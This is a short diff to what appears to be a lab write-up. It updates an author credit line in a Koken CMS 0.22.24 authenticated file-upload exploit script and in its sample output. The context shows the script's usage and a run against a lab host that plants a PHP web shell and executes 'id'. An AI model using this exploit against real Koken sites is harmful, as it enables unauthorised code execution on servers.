@@ -486,7 +486,7 @@ from requests.exceptions import RequestException, JSONDecodeError
 
 # Exploit is based on https://www.exploit-db.com/exploits/48706 
 print("Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)") 
-print("-- devloop.users.sf.net 2022 --") 
+print("-- https://devl00p.github.io/ 2022 --") 
 if len(sys.argv) < 4: 
     print(f"Usage: python {sys.argv[0]} http://target.tld/path/to/token/ email password") 
     sys.exit() 
@@ -564,7 +564,7 @@ You're welcome.
 ```plain
 $ python3 koken_exploit.py http://192.168.56.18:18888/ angela@dundermifflin.com Crinklepuss                                   
 Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) 
--- devloop.users.sf.net 2022 -- 
+-- devl00p.github.io 2022 -- 
 Successfully authenticated as Angela Martin 
 Enjoy your shell at http://192.168.56.18:18888//storage/originals/a6/49/slrejsflxgxopplfbcfp.php?cmd=id 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
